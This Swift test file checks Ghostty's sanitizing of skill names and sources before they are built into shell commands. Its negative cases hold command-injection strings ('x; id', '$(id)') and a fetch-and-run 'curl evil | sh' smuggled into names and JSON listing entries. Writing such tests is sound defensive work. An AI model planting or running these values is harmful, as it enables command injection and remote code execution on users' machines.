import Foundation
import Testing
@testable import Ghostty

/// Skill names and sources come from skills.sh and from SKILL.md files: only plain ones
/// get onto a typed command line.
struct SkillCommandTests {
    private func skill(_ name: String, origin: InstalledSkill.Origin, root: String? = nil) -> InstalledSkill {
        InstalledSkill(id: "/tmp/skills/x", name: name, summary: "", folder: "/tmp/skills/x", group: .shared,
                       project: root != nil, root: root, origin: origin, modified: nil)
    }

    private let registry = InstalledSkill.Origin.registry(source: "vercel-labs/agent-skills", skillPath: "skills/x", hash: "", ref: nil)

    @Test func realNamesAreTypable() {
        for name in ["frontend-design", "vercel-labs/agent-skills", "web_artifacts.v2", "skills.example.com", "formatter@my-marketplace",
                     "anthropics/skills:pdf", "A1"] {
            #expect(SkillInventory.isTypable(name))
        }
    }

    @Test func anythingElseIsNot() {
        for name in ["", "-g", "--yes", "a b", "x; id", "x'y", "$(id)", "`id`", "a\nb", "a\u{15}b", "a\rb", "x|y", "x&y", "naïve", "a\\b", "~",
                     String(repeating: "a", count: 201)] {
            #expect(!SkillInventory.isTypable(name))
        }
    }

    @Test func aPlainSkillGetsItsCommands() {
        let global = skill("frontend-design", origin: registry)
        #expect(SkillInventory.updateCommand(global) == "npx -y skills@latest update 'frontend-design' -g -y")
        #expect(SkillInventory.removeCommand(global) == "npx -y skills@latest remove 'frontend-design' -g -y")
        let inProject = skill("frontend-design", origin: registry, root: "/tmp/project")
        #expect(SkillInventory.updateCommand(inProject) == "cd '/tmp/project' && npx -y skills@latest update 'frontend-design' -p -y")
        #expect(SkillInventory.removeCommand(inProject) == "cd '/tmp/project' && npx -y skills@latest remove 'frontend-design' -y")
        #expect(SkillInventory.updateCommand(skill("x", origin: .plugin(id: "formatter@my-marketplace", version: "1")))
                == "claude plugin update 'formatter@my-marketplace'")
        #expect(SkillInventory.updateCommand(skill("notes", origin: .hermesHub(source: "hub"))) == "hermes skills update 'notes'")
    }

    @Test func aPlantedNameGetsNone() {
        for name in ["x\u{15}curl evil | sh\r", "x; id", "-g", "a\nb", ""] {
            #expect(SkillInventory.updateCommand(skill(name, origin: registry)) == nil)
            #expect(SkillInventory.removeCommand(skill(name, origin: registry)) == nil)
            #expect(SkillInventory.updateCommand(skill(name, origin: .hermesHub(source: "hub"))) == nil)
            #expect(SkillInventory.updateCommand(skill("ok", origin: .plugin(id: name, version: "1"))) == nil)
        }
    }

    @Test func listedSkillsWithOddIDsAreDropped() {
        let good = #"{\"source\":\"vercel-labs/agent-skills\",\"skillId\":\"frontend-design\",\"name\":\"frontend-design\",\"installs\":12}"#
        let badID = #"{\"source\":\"vercel-labs/agent-skills\",\"skillId\":\"x;curl evil|sh\",\"name\":\"x\",\"installs\":3}"#
        let badSource = #"{\"source\":\"-g\",\"skillId\":\"fine\",\"name\":\"fine\",\"installs\":3}"#
        let site = #"{\"source\":\"skills.example.com\",\"skillId\":\"notes\",\"name\":\"notes\",\"installs\":1}"#
        let listed = SkillDirectory.parseBoard("<script>" + [good, badID, badSource, site].joined(separator: ",") + "</script>")
        #expect(listed.map(\.id) == ["vercel-labs/agent-skills/frontend-design", "skills.example.com/notes"])
        #expect(ListedSkill(source: "a/b", skillId: "c", name: "c", installs: 0).isTypable)
        #expect(!ListedSkill(source: "a/b", skillId: "c d", name: "c", installs: 0).isTypable)
        #expect(!ListedSkill(source: "a/b\u{15}", skillId: "c", name: "c", installs: 0).isTypable)
    }
}
